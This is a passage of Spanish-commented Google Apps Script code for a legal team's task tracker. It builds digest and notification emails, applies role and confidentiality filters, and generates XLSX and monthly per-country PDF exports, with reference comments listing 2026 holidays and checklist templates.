    var stamp = '⛔ ' + (reason || '') + ' (' + (slackUser || '') + ', ' + new Date().toLocaleDateString('es-CO') + ')';
    ws.getRange(current.row, 11).setValue(_sanitizeCell((prevNotes ? prevNotes + ' | ' : '') + stamp));
    _logActivity(ctx, taskId, 'block', 'status', current.status || '', 'Bloqueado · ' + (reason || ''));
    return { success: true, id: taskId, nombre: tn, message: 'Tarea bloqueada: #' + taskId + ' "' + tn + '"' };
  } finally {
    lock.releaseLock();
    invalidateCache();
  }
}
function _sendManagerDigest(email, team, teamTasks, originalRecipient) {
  // Vencidas accionables (las On hold no — el digest las separa en su bucket).
  var nO = teamTasks.filter(function(t){ return t.etaDays < 0 && t.status !== 'Bloqueado'; }).length;
  var nT = teamTasks.filter(function(t){ return t.etaDays === 0 && t.status !== 'Bloqueado'; }).length;
  var nS = teamTasks.filter(function(t){ return t.etaDays > 0; }).length;

  var overdueByPerson = {};
  teamTasks.forEach(function(t){
    if (t.etaDays >= 0) return;
    var n = (t.resp || '—').trim();
    overdueByPerson[n] = (overdueByPerson[n] || 0) + 1;
  });
  var top3 = Object.keys(overdueByPerson)
    .map(function(n){ return { name: n, count: overdueByPerson[n] }; })
    .sort(function(a, b){ return b.count - a.count; })
    .slice(0, 3);

  var country = team.country || team.code;
  var subject = '[Legal Tracker · ' + country + '] Resumen del equipo — ' + nO + ' vencidas';
  if (originalRecipient) subject = '[VISTA PREVIA para ' + originalRecipient + '] ' + subject;

  var headerNote = originalRecipient
    ? '<p style="background:#fffbe6;padding:10px 12px;border-left:3px solid #fa8c16;font-size:13px;margin:0 0 16px;color:#7a4f02;">Vista previa · este resumen estaba destinado a <strong>' + _digestEsc(originalRecipient) + '</strong> (líder de ' + _digestEsc(country) + ').</p>'
    : '';

  var top3Html = top3.length === 0
    ? '<p style="color:#888;font-style:italic;margin:0;">Nadie con tareas vencidas. ✓</p>'
    : '<ol style="padding-left:20px;margin:0;">' + top3.map(function(p){
        return '<li style="margin:4px 0;"><strong>' + _digestEsc(p.name) + '</strong> — ' + p.count + ' vencida' + (p.count > 1 ? 's' : '') + '</li>';
      }).join('') + '</ol>';

  var html =
    '<div style="font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;color:#222;max-width:680px;">' +
      headerNote +
      '<h2 style="font-family:Georgia,serif;font-weight:400;margin:0 0 4px;font-size:24px;">Resumen del equipo · ' + _digestEsc(country) + '</h2>' +
      '<p style="margin:0 0 20px;color:#555;">Resumen agregado del equipo. Por confidencialidad no se listan tareas individuales aquí — abrí el tracker para ver detalle.</p>' +
      '<table style="border-collapse:collapse;margin:0 0 20px;">' +
        '<tr><td style="padding:10px 18px;background:#fff1f0;border-left:3px solid #cf1322;font-size:28px;font-weight:600;line-height:1;">' + nO + '</td><td style="padding:10px 14px;color:#555;font-size:14px;">vencidas</td></tr>' +
        '<tr><td style="padding:10px 18px;background:#fff7e6;border-left:3px solid #d48806;font-size:28px;font-weight:600;line-height:1;">' + nT + '</td><td style="padding:10px 14px;color:#555;font-size:14px;">vencen hoy</td></tr>' +
        '<tr><td style="padding:10px 18px;background:#f6ffed;border-left:3px solid #389e0d;font-size:28px;font-weight:600;line-height:1;">' + nS + '</td><td style="padding:10px 14px;color:#555;font-size:14px;">vencen en 48h</td></tr>' +
      '</table>' +
      '<h3 style="font-family:Georgia,serif;font-weight:400;margin:16px 0 8px;font-size:16px;">Personas con más tareas vencidas</h3>' +
      top3Html +
      '<p style="margin:28px 0 0;color:#888;font-size:12px;border-top:1px solid #eee;padding-top:12px;">' +
        'Abrir la vista de equipo: <a href="' + _digestEsc(WEB_APP_URL) + '" style="color:#1565c0;">' + _digestEsc(WEB_APP_URL) + '</a>' +
      '</p>' +
    '</div>';

  MailApp.sendEmail({ to: email, subject: subject, htmlBody: html, name: 'Legal Tracker' });
}

function _digestEsc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// ════════════════════════════════════════════════════════════════
// NOTIFICACIONES · aviso personal por email (Slack: mismo punto, más adelante)
// ════════════════════════════════════════════════════════════════
// Punto ÚNICO de salida para avisos personales disparados por una acción:
//   · 'reassign'     — te asignaron una tarea
//   · 'colaborador'  — te sumaron a una tarea (ver/editar)
//   · 'mention'      — te mencionaron en un comentario (@nombre)
//
// Corre dentro de la sesión del OWNER (executeAs: USER_DEPLOYING) → MailApp
// manda como la cuenta del Tracker, sin pedirle scope nuevo al visitante.
// Best-effort absoluto: cualquier fallo se traga en try/catch — un aviso que
// no sale NUNCA debe abortar la mutación que lo originó.
//
// Kill-switch sin tocar código: Config!NotificacionesEmail = 'off'.
// Confidencialidad: el NOMBRE de una tarea restringido/confidencial no viaja
// en el cuerpo salvo que el destinatario ya tenga acceso explícito (lo acaban
// de asignar / sumar como colaborador). Para @menciones a tareas sensibles se
// manda un aviso genérico con el #id y un link al tracker. Mismo criterio que
// ya se aplica para los posts a canales compartidos.

function _notifEmailEnabled(ctx) {
  var cfg = (ctx && ctx.config) || {};
  var v = (cfg['NotificacionesEmail'] == null ? '' : String(cfg['NotificacionesEmail'])).trim().toLowerCase();
  return v !== 'off' && v !== 'no' && v !== '0' && v !== 'false';
}

// Email del roster para un nombre (tolerante a acentos/orden). '' si no está.
function _notifEmailFor(ctx, name) {
  if (!name) return '';
  var m = getMemberByName(name, ctx.equipos);
  return (m && m.email) ? m.email : '';
}

// Envía UN aviso a `toName`. opts: { kind, taskId, taskName, conf, snippet,
// role (colab), canSeeName }. Devuelve true si salió un mail.
function _notify(ctx, toName, opts) {
  try {
    opts = opts || {};
    if (!_notifEmailEnabled(ctx)) return false;
    var to = _notifEmailFor(ctx, toName);
    if (!to) return false;
    // Nunca auto-notificarse (te mencionás/te reasignás a vos mismo).
    if (ctx.email && to.toLowerCase() === String(ctx.email).toLowerCase()) return false;

    var actor = _digestEsc((ctx.user && ctx.user.name) || 'Alguien');
    var firstName = _digestEsc((((toName || '').toString().trim().split(/\s+/)[0]) || '').trim());
    var conf = (opts.conf || 'estandar').toString().toLowerCase();
    var sensitive = (conf === 'restringido' || conf === 'confidencial');
    var showName = (!sensitive || opts.canSeeName) && opts.taskName;
    var taskLabel = showName ? ('«' + _digestEsc(opts.taskName) + '»') : ('#' + _digestEsc(opts.taskId));

    var subject, lead;
    if (opts.kind === 'reassign') {
      subject = 'Te asignaron una tarea · ' + (showName ? _digestEsc(opts.taskName) : '#' + opts.taskId);
      lead = actor + ' te asignó la tarea ' + taskLabel + '. Ahora figura en tu tracker.';
    } else if (opts.kind === 'colaborador') {
      var roleTxt = (opts.role === 'editar') ? 'editar' : 'ver';
      subject = 'Te sumaron a una tarea · ' + (showName ? _digestEsc(opts.taskName) : '#' + opts.taskId);
      lead = actor + ' te agregó como colaborador (<b>' + roleTxt + '</b>) en ' + taskLabel + '.';
    } else if (opts.kind === 'mention') {
      subject = 'Te mencionaron en un comentario · ' + (showName ? _digestEsc(opts.taskName) : '#' + opts.taskId);
      lead = actor + ' te mencionó en un comentario de la tarea ' + taskLabel + '.';
    } else {
      return false;
    }

    var snippetHtml = '';
    if (opts.snippet) {
      var snip = String(opts.snippet).substring(0, 300);
      snippetHtml = '<blockquote style="margin:14px 0;padding:8px 14px;border-left:3px solid #ddd;color:#555;font-style:italic;">'
        + _digestEsc(snip) + '</blockquote>';
    }

    var html =
      '<div style="font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;color:#222;max-width:600px;">' +
        '<p style="margin:0 0 8px;font-size:15px;">Hola' + (firstName ? ' ' + firstName : '') + ',</p>' +
        '<p style="margin:0 0 4px;font-size:15px;">' + lead + '</p>' +
        snippetHtml +
        '<p style="margin:20px 0 0;"><a href="' + _digestEsc(WEB_APP_URL) +
          '" style="display:inline-block;background:#FF441F;color:#fff;text-decoration:none;padding:9px 16px;border-radius:6px;font-size:14px;">Abrir en el Tracker →</a></p>' +
        '<p style="margin:24px 0 0;color:#999;font-size:12px;border-top:1px solid #eee;padding-top:12px;">' +
          'Recibís este aviso porque sos parte del equipo Legal en MyDash. ' +
          'Para dejar de recibirlos, escribile a tu líder de equipo.' +
        '</p>' +
      '</div>';

    MailApp.sendEmail({ to: to, subject: subject, htmlBody: html, name: 'Legal Tracker' });

    // ── EXTENSIÓN SLACK (cuando SecOps lo destrabe): despachar acá el MISMO
    // evento al DM del destinatario (mapeo email→Slack vía users.lookupByEmail),
    // respetando `sensitive` igual que arriba. Un solo punto, sin duplicar la
    // lógica de a-quién/qué-mostrar.

    return true;
  } catch (e) {
    Logger.log('_notify skipped (' + (opts && opts.kind) + '): ' + ((e && e.message) || e));
    return false;
  }
}

// Normalización laxa que CONSERVA el '@' (a diferencia de _normalizeName, que
// lo descarta). Acentos fuera, minúsculas, espacios colapsados.
function _normLoose(s) {
  var out = (s == null ? '' : String(s));
  try { out = out.normalize('NFD').replace(new RegExp('[\\u0300-\\u036f]', 'g'), ''); } catch (e) {}
  return out.toLowerCase().replace(/\s+/g, ' ').trim();
}

// Extrae los nombres del roster mencionados con @ en un texto. Matching robusto:
// para cada miembro del roster busca "@" + su nombre completo normalizado en el
// cuerpo. Evita el parsing ambiguo de "@Juan" (¿qué Juan?) — la mención se
// inserta con el nombre completo desde la UI; un typer manual que escriba el
// nombre completo también matchea. Devuelve nombres canónicos (dedup), cap 10.
function _extractMentions(ctx, body) {
  var text = (body || '').toString();
  if (text.indexOf('@') < 0) return [];
  var hay = ' ' + _normLoose(text) + ' ';
  var idx = _buildEquiposIndex(ctx.equipos);
  var out = [], seen = {};
  for (var i = 0; i < idx.entries.length && out.length < 10; i++) {
    var e = idx.entries[i];
    if (!e.norm || seen[e.norm]) continue;
    // "@nombre completo" (con o sin espacio tras el @).
    if (hay.indexOf('@' + e.norm) >= 0 || hay.indexOf('@ ' + e.norm) >= 0) {
      seen[e.norm] = 1;
      out.push(e.name);
    }
  }
  return out;
}

// ════════════════════════════════════════════════════════════════
// TELEMETRY · README
// ════════════════════════════════════════════════════════════════
// - Cómo ver los logs: Apps Script editor → "Ejecuciones" (View → Executions).
//   Cada llamada a un entry-point wrappeado emite un JSON con
//   { ts, email, fn, duration, success, error, meta } vía console.info.
//   En GCP Logging filtrá por jsonPayload.fn="updateTaskFields" para ver
//   por función o jsonPayload.success=false para ver errores.
// - Cómo activar la hoja Telemetry: el dueño del spreadsheet crea
//   manualmente una hoja con el nombre exacto 'Telemetry' y columnas
//   ts | email | fn | duration_ms | status | error | meta. A partir de
//   ese momento cada call queda persistido (1 row por call). Sin la hoja,
//   los logs viven solo en Stackdriver y se rotan según política de GCP.
// - Por qué NO loguea el body de las requests: las tareas/proyectos pueden
//   contener nombres de personas, notas confidenciales (cláusulas, montos,
//   contrapartes). Solo loggeamos metadata booleana o counts (ej. hasResp,
//   fieldCount) para correlacionar sin filtrar PII.
// - Entry-points wrappeados (5): getEditorialData, addTask, updateTaskFields,
//   closeTaskById, blockTaskById. El resto (updateTaskField, addProject,
//   uploadDocument, etc.) no está wrappeado para minimizar diff; agregar
//   más siguiendo el mismo patrón si hace falta más visibilidad.

// ════════════════════════════════════════════════════════════════
// FERIADOS 2026 · COPY-PASTE A LA HOJA 'Feriados'
// ════════════════════════════════════════════════════════════════
// Para activar el cálculo en días hábiles excluyendo feriados:
//   1. Crear hoja llamada exactamente 'Feriados' en el spreadsheet del tracker
//   2. Headers en fila 1: pais | fecha | nombre
//   3. Pegar las filas de abajo (sin el // del inicio) a partir de la fila 2
//   4. Esperar hasta 1h (cache TTL) o ejecutar manualmente
//      `CacheService.getScriptCache().remove('feriados_v1')` en el editor
//
// Fuente: calendarios oficiales 2026 — CO Ley Emiliani aplicada, MX Art. 74
// LFT + viernes santo (uso común), CR Ley 2412 + costumbre.
// Verificá contra el calendario oficial de tu país antes de pegar.
//
// COLOMBIA 2026 (18 feriados)
// CO	2026-01-01	Año Nuevo
// CO	2026-01-12	Reyes Magos
// CO	2026-03-23	Día de San José
// CO	2026-04-02	Jueves Santo
// CO	2026-04-03	Viernes Santo
// CO	2026-05-01	Día del Trabajo
// CO	2026-05-18	Ascensión del Señor
// CO	2026-06-08	Corpus Christi
// CO	2026-06-15	Sagrado Corazón
// CO	2026-06-29	San Pedro y San Pablo
// CO	2026-07-20	Día de la Independencia
// CO	2026-08-07	Batalla de Boyacá
// CO	2026-08-17	Asunción de la Virgen
// CO	2026-10-12	Día de la Raza
// CO	2026-11-02	Día de Todos los Santos
// CO	2026-11-16	Independencia de Cartagena
// CO	2026-12-08	Día de la Inmaculada Concepción
// CO	2026-12-25	Navidad
//
// MÉXICO 2026 (8 feriados oficiales + Viernes Santo)
// MX	2026-01-01	Año Nuevo
// MX	2026-02-02	Día de la Constitución
// MX	2026-03-16	Natalicio de Benito Juárez
// MX	2026-04-03	Viernes Santo
// MX	2026-05-01	Día del Trabajo
// MX	2026-09-16	Día de la Independencia
// MX	2026-11-02	Día de Muertos
// MX	2026-11-16	Día de la Revolución
// MX	2026-12-25	Navidad
//
// COSTA RICA 2026 (11 feriados nacionales)
// CR	2026-01-01	Año Nuevo
// CR	2026-04-02	Jueves Santo
// CR	2026-04-03	Viernes Santo
// CR	2026-04-11	Juan Santamaría
// CR	2026-05-01	Día del Trabajo
// CR	2026-07-25	Anexión de Guanacaste
// CR	2026-08-02	Virgen de los Ángeles
// CR	2026-08-15	Día de la Madre
// CR	2026-09-15	Día de la Independencia
// CR	2026-12-01	Abolición del Ejército
// CR	2026-12-25	Navidad

// ════════════════════════════════════════════════════════════════
// TEMPLATES · COPY-PASTE A LA HOJA 'Templates'
// ════════════════════════════════════════════════════════════════
// Cómo activar: el dueño del spreadsheet crea una hoja llamada exactamente
// 'Templates' con dos columnas en la fila 1 (headers):
//     A: tipoTrabajo   B: checklist
// Cada fila siguiente: una plantilla. La columna B contiene un JSON array
// de strings — los ítems del checklist. Cuando un usuario crea una tarea
// con ese tipoTrabajo y deja el campo 'Notas' vacío, el backend pre-rellena
// notas con "- item1\n- item2\n…" (editable luego). Si la hoja no existe,
// se omite el prefill silenciosamente (backwards-compat).
//
// Samples (copiar las filas A-B tal cual; el JSON va en una sola celda B):
//
// A: Revisión NDA
// B: ["Verificar partes", "Jurisdicción aplicable", "Cláusulas IP", "Término", "Confidencialidad recíproca"]
//
// A: Revisión contractual
// B: ["Partes y representación", "Objeto del contrato", "Plazo y vigencia", "Precio y forma de pago", "Resolución / terminación", "Confidencialidad", "Ley aplicable y jurisdicción"]
//
// A: Derecho de petición
// B: ["Identificación del peticionario", "Hechos relevantes", "Pretensión clara", "Fundamento jurídico", "Soportes y anexos", "Plazo legal de respuesta (15 días hábiles)"]
//
// Cómo agregar plantillas custom: nueva fila con el tipoTrabajo exacto que
// usás en el dropdown del form + checklist como JSON array. El cache TTL
// es 1h (clave 'templates_v1') — para forzar refresh inmediato, hacé un
// pequeño edit en cualquier celda de la hoja y esperá <1h o limpiá el
// cache desde el editor de Apps Script. Filas con JSON inválido se loggean
// (Logger.log) y se omiten sin romper la app.

// ════════════════════════════════════════════════════════════════
// EXPORTS · XLSX of filtered tracker + Monthly PDF per country
// ════════════════════════════════════════════════════════════════
// Dos entry-points pensados para presentaciones (board, country leaders).
// Ambos respetan permisos: nunca se exporta una tarea que el usuario no
// vería en la UI (rol + confidencialidad), porque parten de
// getEditorialData() / _buildViewForRole().

// Escapa contenido de usuario para inyectar en HTML (PDF report).
function _pdfEsc(s) {
  if (s == null) return '';
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Carpeta común "Legal Tracker · Exports" en la raíz del Drive del owner.
// Si ya existe se reutiliza; si no, se crea (no es destructivo, solo lectura/append).
function _getOrCreateExportsFolder() {
  var name = 'Legal Tracker · Exports';
  var it = DriveApp.getFoldersByName(name);
  if (it.hasNext()) return it.next();
  return DriveApp.createFolder(name);
}

// Aplica los filtros del UI (mismos que EDT en el frontend) sobre tareas
// ya pre-filtradas por rol + confidencialidad.
function _applyExportFilters(tasks, filters) {
  filters = filters || {};
  var out = tasks.slice();
  // status: 'all'|'overdue'|'today'|'blocked' (mismo enum que EDT.filter) o nombre de estado literal.
  if (filters.status && filters.status !== 'ALL' && filters.status !== 'all') {
    var st = String(filters.status);
    if (st === 'overdue') {
      out = out.filter(function(t){ return typeof t.etaDays === 'number' && t.etaDays < 0 && t.status !== 'Listo' && t.status !== 'Bloqueado'; });
    } else if (st === 'today') {
      out = out.filter(function(t){ return t.etaDays === 0 && t.status !== 'Listo'; });
    } else if (st === 'blocked') {
      out = out.filter(function(t){ return t.status === 'Bloqueado'; });
    } else if (st === 'open' || st === 'active') {
      out = out.filter(function(t){ return t.status !== 'Listo'; });
    } else {
      // Literal status name ("En curso", "Pendiente", etc.)
      out = out.filter(function(t){ return (t.status || '') === st; });
    }
  }
  if (filters.country && filters.country !== 'ALL') {
    var cc = String(filters.country);
    out = out.filter(function(t){ return (t.pais || '') === cc; });
  }
  if (filters.project && filters.project !== 'ALL') {
    var pf = String(filters.project);
    out = out.filter(function(t) {
      return String(t.proyectoId || '') === pf || (t.proyecto || '') === pf;
    });
  }
  if (filters.owner && filters.owner !== 'ALL') {
    var ow = String(filters.owner).toLowerCase();
    out = out.filter(function(t){ return (t.resp || '').toLowerCase() === ow; });
  }
  if (filters.confidentiality && filters.confidentiality !== 'ALL') {
    var cf = String(filters.confidentiality).toLowerCase();
    out = out.filter(function(t) {
      var lvl = (t.confidencialidad || 'estandar').toString().trim().toLowerCase() || 'estandar';
      return lvl === cf;
    });
  }
  // Cliente interno (área solicitante): espeja EDT.clienteFilter para que
  // "Excel (vista actual)" devuelva exactamente las filas que el user ve.
  if (filters.cliente && filters.cliente !== 'ALL') {
    var cl = String(filters.cliente);
    out = out.filter(function(t){ return (t.areaSolicitante || '') === cl; });
  }
  if (filters.myOnly && filters.search) {
    // No-op placeholder, mantained for symmetry with frontend search if needed.
  }
  if (filters.search) {
    var s = String(filters.search).toLowerCase();
    out = out.filter(function(t) {
      return ((t.id || '') + '').toLowerCase().indexOf(s) >= 0
          || ((t.nombre || '') + '').toLowerCase().indexOf(s) >= 0
          || ((t.resp || '') + '').toLowerCase().indexOf(s) >= 0
          || ((t.proyecto || '') + '').toLowerCase().indexOf(s) >= 0
          || ((t.tipoTrabajo || '') + '').toLowerCase().indexOf(s) >= 0;
    });
  }
  return out;
}

// Entry-point: genera un Spreadsheet (XLSX abrible en Google Sheets) con la
// vista filtrada actual del tracker. Devuelve la URL del archivo.
function exportTrackerXLSX(filters) {
  return _telemetry('exportTrackerXLSX', function() {
    return _exportTrackerXLSXImpl(filters);
  }, { hasFilters: !!filters });
}

function _exportTrackerXLSXImpl(filters) {
  // getEditorialData() ya aplica el filtrado por rol + confidencialidad
  // (a través de _buildViewForRole). Nunca se exporta lo que el usuario
  // no podría ver en la UI.
  var data = getEditorialData();
  var tasks = (data && data.tasks) || [];

  // Filtros del UI encima del set rol-filtrado.
  tasks = _applyExportFilters(tasks, filters);

  var tz = 'America/Bogota';
  var stamp = Utilities.formatDate(new Date(), tz, 'yyyy-MM-dd HH:mm');
  var fileName = 'Legal Tracker Export ' + stamp;
  var ss = SpreadsheetApp.create(fileName);
  var sheet = ss.getActiveSheet();
  sheet.setName('Tracker');

  var headers = ['ID','Tarea','Responsable','País','Líder','Estado','Prioridad','Plazo','ETA','Creada','Proyecto','Tipo','Riesgo','Contraparte','Confidencialidad','Notas'];
  sheet.getRange(1, 1, 1, headers.length).setValues([headers]).setFontWeight('bold');

  var rows = tasks.map(function(t) {
    var notes = (t.notas || '').toString();
    if (notes.length > 500) notes = notes.substring(0, 500) + '…';
    var counterparty = t.contraparte || t.counterparty || '';
    return _sanitizeRow([
      t.id || '',
      t.nombre || '',
      t.resp || '',
      t.pais || '',
      t.lider || '',
      t.status || '',
      t.priority || '',
      t.deadline || '',
      t.eta || '',
      t.creado || '',
      t.proyecto || (t.proyectoId ? ('#' + t.proyectoId) : ''),
      t.tipoTrabajo || '',
      t.riesgo || '',
      counterparty,
      t.confidencialidad || 'estandar',
      notes
    ]);
  });
  if (rows.length > 0) {
    sheet.getRange(2, 1, rows.length, headers.length).setValues(rows);
  }
  sheet.setFrozenRows(1);
  try { sheet.autoResizeColumns(1, headers.length); } catch (e) {}

  // Mover a la carpeta de exports + compartir con el usuario.
  var file = DriveApp.getFileById(ss.getId());
  try {
    var folder = _getOrCreateExportsFolder();
    // En API legacy, addFile + removeFile from root para mover.
    folder.addFile(file);
    try { DriveApp.getRootFolder().removeFile(file); } catch (e) {}
  } catch (e) {
    // Si falla el move, el archivo sigue accesible en la raíz del owner.
  }
  try {
    var email = '';
    try { email = Session.getActiveUser().getEmail() || ''; } catch (e) {}
    if (email) file.addEditor(email);
  } catch (e) {}

  return {
    success: true,
    url: file.getUrl(),
    fileName: fileName,
    rowCount: rows.length
  };
}

// Entry-point: PDF mensual por país con KPIs, cierres, abiertas al EOM y
// top performers/proyectos. countryCode ej 'CO'; monthISO ej '2026-05'.
function exportMonthlyCountryPDF(countryCode, monthISO) {
  return _telemetry('exportMonthlyCountryPDF', function() {
    return _exportMonthlyCountryPDFImpl(countryCode, monthISO);
  }, { countryCode: countryCode || '', monthISO: monthISO || '' });
}

function _exportMonthlyCountryPDFImpl(countryCode, monthISO) {
  if (!countryCode) throw new Error('Falta countryCode.');
  if (!monthISO || !/^\d{4}-\d{2}$/.test(monthISO)) throw new Error('monthISO debe tener formato YYYY-MM.');

  var ctx = _getAuthContext();
  // Auth: solo head o manager del país solicitado.
  if (ctx.role !== 'head') {
    if (ctx.role !== 'manager' || !ctx.user || ctx.user.code !== countryCode) {
      throw new Error('No autorizado');
    }
  }

  var parts = monthISO.split('-');
  var year = parseInt(parts[0], 10);
  var monthIdx = parseInt(parts[1], 10) - 1; // 0-indexed JS
  var monthStart = new Date(year, monthIdx, 1, 0, 0, 0);
  var monthEnd   = new Date(year, monthIdx + 1, 1, 0, 0, 0); // exclusive
  var monthLabel = Utilities.formatDate(monthStart, 'America/Bogota', 'MMMM yyyy');

  var raw = _cachedRawData();
  var equipos = raw.equipos || [];
  // CONFIDENCIALIDAD: filtrar por rol ANTES de armar el PDF. Antes el export
  // usaba raw.tasks/raw.historial SIN filtrar y solo recortaba por país, así que
  // un manager veía en el PDF tareas confidenciales/restringidas de su país que
  // la UI le oculta. filterTasksForRole replica exactamente la visibilidad del
  // rol (head ve todo; manager ve lo permitido por confidencialidad).
  var allActive = filterTasksForRole(raw.tasks || [], ctx.role, ctx.user, equipos);
  var allHist   = filterTasksForRole(raw.historial || [], ctx.role, ctx.user, equipos);

  function inCountry(t) {
    var cc = t.pais || getCountryForMember(t.resp, equipos);
    return cc === countryCode;
  }

  var activeC = allActive.filter(inCountry);
  var histC   = allHist.filter(inCountry);

  function parseCreado(t) {
    if (!t.creadoRaw) return null;
    try { return new Date(t.creadoRaw); } catch (e) { return null; }
  }
  function parseCerrado(t) {
    if (!t.cerrado) return null;
    // 'dd/MM/yyyy'
    var p = t.cerrado.split('/');
    if (p.length !== 3) return null;
    var d = parseInt(p[0],10), m = parseInt(p[1],10)-1, y = parseInt(p[2],10);
    if (isNaN(d) || isNaN(m) || isNaN(y)) return null;
    return new Date(y, m, d);
  }
  function inMonth(date) {
    if (!date) return false;
    return date >= monthStart && date < monthEnd;
  }

  // 1) Opened in month (active + historial — la tarea puede haberse abierto y cerrado en el mismo mes).
  var openedInMonth = activeC.concat(histC).filter(function(t) {
    var c = parseCreado(t);
    return inMonth(c);
  });

  // 2) Closed in month (de historial — wsHistorial guarda cerrado).
  var closedInMonth = histC.filter(function(t) {
    return inMonth(parseCerrado(t));
  });

  // 3) Overdue at EOM: tareas abiertas (no cerradas antes del EOM) con deadline < monthEnd.
  // Conjunto = activas hoy con deadline < monthEnd  ∪  historial que se cerró DESPUÉS de monthEnd (todavía estaban abiertas en EOM) con deadline < monthEnd.
  // Como aproximación honesta usamos activas hoy + historial cerrado después.
  function deadlineBeforeEOM(t) {
    if (!t.deadlineISO) return false;
    try {
      var dl = new Date(t.deadlineISO + 'T00:00:00');
      return dl < monthEnd;
    } catch (e) { return false; }
  }
  var stillOpenAtEOM = activeC.filter(function(t) {
    // todavía abiertas (no cerradas) y creadas antes del EOM
    var c = parseCreado(t);
    return c && c < monthEnd && t.status !== 'Listo';
  }).concat(histC.filter(function(t) {
    var c = parseCreado(t);
    var cl = parseCerrado(t);
    return c && c < monthEnd && cl && cl >= monthEnd;
  }));
  var overdueAtEOM = stillOpenAtEOM.filter(deadlineBeforeEOM);

  // 4) On-time %: de las cerradas en el mes, cuántas dentro de SLA.
  var onTime = 0;
  closedInMonth.forEach(function(t) {
    var c = parseCreado(t);
    var cl = parseCerrado(t);
    if (!c || !cl) return;
    var biz = countBizDays(c, cl);
    var lim = SLA_LIMITS[t.priority] || 5;
    if (biz <= lim) onTime++;
  });
  var onTimePct = closedInMonth.length === 0 ? null : Math.round((onTime / closedInMonth.length) * 100);

  // 5) Top 5 members por # cerradas en mes.
  var perMember = {};
  closedInMonth.forEach(function(t) {
    var k = t.resp || '—';
    perMember[k] = (perMember[k] || 0) + 1;
  });
  var topMembers = Object.keys(perMember).map(function(k){ return { name: k, count: perMember[k] }; })
    .sort(function(a,b){ return b.count - a.count; }).slice(0, 5);

  // 6) Top 5 proyectos por # cerradas en mes.
  var perProj = {};
  closedInMonth.forEach(function(t) {
    var k = t.proyecto || (t.proyectoId ? ('#' + t.proyectoId) : '—');
    perProj[k] = (perProj[k] || 0) + 1;
  });
  var topProjects = Object.keys(perProj).map(function(k){ return { name: k, count: perProj[k] }; })
    .sort(function(a,b){ return b.count - a.count; }).slice(0, 5);

  // Build HTML for the PDF.
  var countryEntry = equipos.filter(function(e){ return e.code === countryCode; })[0] || {};
  var countryName = countryEntry.country || countryCode;
  var generatedAt = Utilities.formatDate(new Date(), 'America/Bogota', 'dd/MM/yyyy HH:mm');

  function statCard(label, value, sub) {
    return '<div class="card">'
      + '<div class="label">' + _pdfEsc(label) + '</div>'
      + '<div class="value">' + _pdfEsc(String(value)) + '</div>'
      + (sub ? '<div class="sub">' + _pdfEsc(sub) + '</div>' : '')
      + '</div>';
  }

  function rowsClosed(arr) {
    if (!arr.length) return '<tr><td colspan="5" class="empty">No hay tareas cerradas en este mes.</td></tr>';
    return arr.map(function(t) {
      var c = parseCreado(t), cl = parseCerrado(t);
      var biz = (c && cl) ? countBizDays(c, cl) : null;
      var lim = SLA_LIMITS[t.priority] || 5;
      var sla = (biz == null) ? '—' : (biz <= lim ? 'En tiempo (' + biz + 'd ≤ ' + lim + 'd)' : 'Fuera de tiempo (' + biz + 'd > ' + lim + 'd)');
      return '<tr>'
        + '<td>' + _pdfEsc(t.id) + '</td>'
        + '<td>' + _pdfEsc(t.nombre || '') + '</td>'
        + '<td>' + _pdfEsc(t.resp || '') + '</td>'
        + '<td>' + _pdfEsc(t.cerrado || '') + '</td>'
        + '<td>' + _pdfEsc(sla) + '</td>'
        + '</tr>';
    }).join('');
  }
  function rowsOpen(arr) {
    if (!arr.length) return '<tr><td colspan="5" class="empty">No hay tareas abiertas al cierre del mes.</td></tr>';
    return arr.map(function(t) {
      return '<tr>'
        + '<td>' + _pdfEsc(t.id) + '</td>'
        + '<td>' + _pdfEsc(t.nombre || '') + '</td>'
        + '<td>' + _pdfEsc(t.resp || '') + '</td>'
        + '<td>' + _pdfEsc(t.priority || '') + '</td>'
        + '<td>' + _pdfEsc(t.deadline || '') + '</td>'
        + '</tr>';
    }).join('');
  }
  function rowsTop(arr, kind) {
    if (!arr.length) return '<tr><td colspan="2" class="empty">Sin datos.</td></tr>';
    return arr.map(function(r) {
      return '<tr><td>' + _pdfEsc(r.name) + '</td><td>' + r.count + ' cerradas</td></tr>';
    }).join('');
  }

  var html = ''
    + '<!doctype html><html><head><meta charset="utf-8">'
    + '<style>'
    +   'body { font-family: Arial, Helvetica, sans-serif; color: #1a1a1a; padding: 28px; }'
    +   'h1 { font-size: 22px; margin: 0 0 4px 0; }'
    +   '.eyebrow { font-size: 11px; letter-spacing: 1px; text-transform: uppercase; color: #888; margin-bottom: 6px; }'
    +   '.lede { font-size: 12px; color: #555; margin-bottom: 18px; }'
    +   '.kpis { display: table; width: 100%; border-collapse: separate; border-spacing: 8px; margin-bottom: 18px; }'
    +   '.card { display: table-cell; border: 1px solid #ddd; padding: 10px 12px; border-radius: 4px; width: 25%; }'
    +   '.card .label { font-size: 10px; color: #777; text-transform: uppercase; letter-spacing: 0.5px; }'
    +   '.card .value { font-size: 22px; font-weight: bold; margin-top: 4px; }'
    +   '.card .sub { font-size: 10px; color: #888; margin-top: 2px; }'
    +   'h2 { font-size: 14px; margin: 20px 0 8px 0; border-bottom: 1px solid #eee; padding-bottom: 4px; }'
    +   'table.data { width: 100%; border-collapse: collapse; font-size: 11px; }'
    +   'table.data th, table.data td { padding: 6px 8px; border-bottom: 1px solid #eee; text-align: left; vertical-align: top; }'
    +   'table.data th { background: #f7f7f7; font-weight: bold; }'
    +   '.empty { color: #999; font-style: italic; text-align: center; padding: 12px; }'
    +   '.two-col { display: table; width: 100%; border-spacing: 12px 0; }'
    +   '.two-col > div { display: table-cell; width: 50%; vertical-align: top; }'
    +   '.footer { margin-top: 24px; padding-top: 8px; border-top: 1px solid #eee; font-size: 10px; color: #999; }'
    + '</style></head><body>'
    + '<div class="eyebrow">' + _pdfEsc(countryCode) + ' · Legal Tracker</div>'
    + '<h1>Reporte mensual · ' + _pdfEsc(monthLabel) + '</h1>'
